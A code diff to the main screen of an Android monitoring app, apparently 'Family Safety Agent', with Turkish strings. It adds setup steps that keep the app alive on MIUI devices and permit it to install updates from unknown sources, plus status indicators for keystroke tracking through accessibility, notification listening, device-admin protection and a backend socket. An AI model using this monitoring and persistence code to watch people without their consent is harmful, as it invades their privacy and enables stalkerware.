@@ -8,6 +8,8 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.Color
+import android.graphics.drawable.GradientDrawable
 import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Build
@@ -15,8 +17,10 @@ import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
+import android.view.View
 import android.widget.Button
 import android.widget.EditText
+import android.widget.ImageButton
 import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
@@ -26,6 +30,9 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var projectionManager: MediaProjectionManager
     private lateinit var tvStatus: TextView
+    private lateinit var tvProtectionStatus: TextView
+    private lateinit var dotConnectionStatus: View
+    private lateinit var tvConnectionStatus: TextView
 
     // Aynı anda birden fazla dialog açılmasını önler
     private var dialogShowing = false
@@ -87,13 +94,21 @@ class MainActivity : AppCompatActivity() {
         try {
             setContentView(R.layout.activity_main)
             projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-            tvStatus = findViewById(R.id.tvStatus)
+            tvStatus           = findViewById(R.id.tvStatus)
+            tvProtectionStatus = findViewById(R.id.tvProtectionStatus)
+            dotConnectionStatus = findViewById(R.id.dotConnectionStatus)
+            tvConnectionStatus  = findViewById(R.id.tvConnectionStatus)
 
             val etUrl     = findViewById<EditText>(R.id.etBackendUrl)
             val etProfile = findViewById<EditText>(R.id.etProfileId)
             val btnSave   = findViewById<Button>(R.id.btnSave)
             val btnPerm   = findViewById<Button>(R.id.btnPermission)
             val btnStart  = findViewById<Button>(R.id.btnStartService)
+            val btnSettings = findViewById<ImageButton>(R.id.btnSettings)
+
+            btnSettings.setOnClickListener {
+                startActivity(Intent(this, SettingsActivity::class.java))
+            }
 
             val prefs = getSharedPreferences("config", MODE_PRIVATE)
             Config.backendUrl = prefs.getString("backend_url", Config.backendUrl) ?: Config.backendUrl
@@ -188,6 +203,15 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
+        // ADIM 5b: MIUI Kilitleme Ekranı Uygulama Kapatma
+        if (isMiuiDevice()) {
+            val prefs = getSharedPreferences("config", MODE_PRIVATE)
+            if (!prefs.getBoolean("miui_lock_cleanup_shown", false)) {
+                showMiuiLockCleanupDialog()
+                return
+            }
+        }
+
         // ADIM 6: Device Admin (opsiyonel — bir kez göster)
         val prefs = getSharedPreferences("config", MODE_PRIVATE)
         if (!isDeviceAdminActive() && !prefs.getBoolean("device_admin_shown", false)) {
@@ -201,6 +225,22 @@ class MainActivity : AppCompatActivity() {
                 actionLabel = "Device Admin Etkinleştir"
             ) { requestDeviceAdmin() }
             return
+        }
+
+        // ADIM 7: Bilinmeyen Kaynaktan Yükleme (USB Yükleme)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
+            if (!prefs.getBoolean("unknown_sources_shown", false)) {
+                prefs.edit().putBoolean("unknown_sources_shown", true).apply()
+                showOnceDialog(
+                    key         = "unknown_sources_shown",
+                    title       = "Bilinmeyen Kaynak — Yükleme İzni",
+                    message     = "Uygulamanın güncellenebilmesi için bu uygulamadan " +
+                                  "yüklemeye izin verin.\n\n" +
+                                  "Açılan ekranda 'Bu kaynağa izin ver' seçeneğini açın.",
+                    actionLabel = "İzin Ayarları"
+                ) { openUnknownSourcesSettings() }
+                return
+            }
         }
 
         // ── Tüm adımlar tamam → izlemeyi başlat ──────────────────────────────
@@ -299,6 +339,48 @@ class MainActivity : AppCompatActivity() {
             .show()
     }
 
+    private fun showMiuiLockCleanupDialog() {
+        dialogShowing = true
+        AlertDialog.Builder(this)
+            .setTitle("MIUI — Kilitleme Ekranı Kapatma")
+            .setMessage(
+                "MIUI, ekran kilitlendiğinde arka plan uygulamalarını kapatabilir. " +
+                "Bunu devre dışı bırakın:\n\n" +
+                "Yöntem 1:\n" +
+                "Güvenlik uygulaması → Pil Tasarrufu\n" +
+                "→ Son Uygulamalar Kilidi → Family Safety Agent → Kilitle\n\n" +
+                "Yöntem 2:\n" +
+                "Son uygulamalar ekranında uygulamayı uzun basın\n" +
+                "→ Kilitle (asma kilit ikonu)"
+            )
+            .setPositiveButton("Güvenlik Uygulamasına Git") { _, _ ->
+                getSharedPreferences("config", MODE_PRIVATE)
+                    .edit().putBoolean("miui_lock_cleanup_shown", true).apply()
+                openMiuiSecurityCenter()
+            }
+            .setNegativeButton("Anladım") { _, _ ->
+                getSharedPreferences("config", MODE_PRIVATE)
+                    .edit().putBoolean("miui_lock_cleanup_shown", true).apply()
+                dialogShowing = false
+                advanceSetupChain()
+            }
+            .setOnDismissListener { dialogShowing = false }
+            .show()
+    }
+
+    private fun openMiuiSecurityCenter() {
+        val intents = listOf(
+            Intent().setClassName("com.miui.securitycenter",
+                "com.miui.securitycenter.MainActivity"),
+            Intent().setClassName("com.miui.powerkeeper",
+                "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity")
+        )
+        for (intent in intents) {
+            try { startActivity(intent); return } catch (_: Exception) {}
+        }
+        openAppSettings()
+    }
+
     private fun autoStartMonitoring() {
         // Zaten çalışıyorsa tekrar başlatma
         if (SocketManager.isSignalConnected()) return
@@ -373,6 +455,19 @@ class MainActivity : AppCompatActivity() {
         })
     }
 
+    private fun openUnknownSourcesSettings() {
+        val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
+                data = Uri.fromParts("package", packageName, null)
+            }
+        } else {
+            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                data = Uri.fromParts("package", packageName, null)
+            }
+        }
+        startActivity(intent)
+    }
+
     private fun openMiuiAutostart() {
         val intents = listOf(
             Intent().setClassName("com.miui.securitycenter",
@@ -389,12 +484,40 @@ class MainActivity : AppCompatActivity() {
     // ── Durum ekranı ─────────────────────────────────────────────────────────
 
     private fun updateStatus() {
+        val canInstall = try {
+            Build.VERSION.SDK_INT < Build.VERSION_CODES.O ||
+                    packageManager.canRequestPackageInstalls()
+        } catch (e: SecurityException) {
+            Log.e("FSA", "REQUEST_INSTALL_PACKAGES izni eksik: ${e.message}")
+            false
+        }
+        val socketOk = SocketManager.isSignalConnected()
+        val allReady = allPermissionsGranted() && isAccessibilityEnabled() &&
+                isNotificationListenerEnabled() && isBatteryOptimizationIgnored()
+
+        // Hero: Koruma durumu
+        if (allReady) {
+            tvProtectionStatus.text = "⬤  Koruma Aktif"
+            tvProtectionStatus.setTextColor(Color.parseColor("#4CAF50"))
+        } else {
+            tvProtectionStatus.text = "⚠  Kurulum Gerekli"
+            tvProtectionStatus.setTextColor(Color.parseColor("#FF9800"))
+        }
+
+        // Bağlantı noktası ve metni
+        val dotColor = if (socketOk) "#4CAF50" else "#F44336"
+        (dotConnectionStatus.background as? GradientDrawable)?.setColor(Color.parseColor(dotColor))
+        tvConnectionStatus.text = if (socketOk) "Backend bağlı — ${Config.backendUrl}" else "Backend bağlantısı yok"
+        tvConnectionStatus.setTextColor(Color.parseColor(if (socketOk) "#888888" else "#FF5252"))
+
         val checks = listOf(
-            allPermissionsGranted()          to "Runtime izinler",
-            isAccessibilityEnabled()         to "Klavye takibi (Erişilebilirlik)",
-            isNotificationListenerEnabled()  to "Bildirim dinleyici",
-            isBatteryOptimizationIgnored()   to "Pil optimizasyonu muafiyeti",
-            SocketManager.isSignalConnected() to "Socket bağlantısı",
+            allPermissionsGranted()           to "Runtime izinler",
+            isAccessibilityEnabled()          to "Klavye takibi (Erişilebilirlik)",
+            isNotificationListenerEnabled()   to "Bildirim dinleyici",
+            isBatteryOptimizationIgnored()    to "Pil optimizasyonu muafiyeti",
+            isDeviceAdminActive()             to "Cihaz yöneticisi (koruma kalkanı)",
+            canInstall                        to "Bilinmeyen kaynak yükleme",
+            socketOk                          to "Socket bağlantısı",
         )
         tvStatus.text = buildString {
             checks.forEach { (ok, label) ->
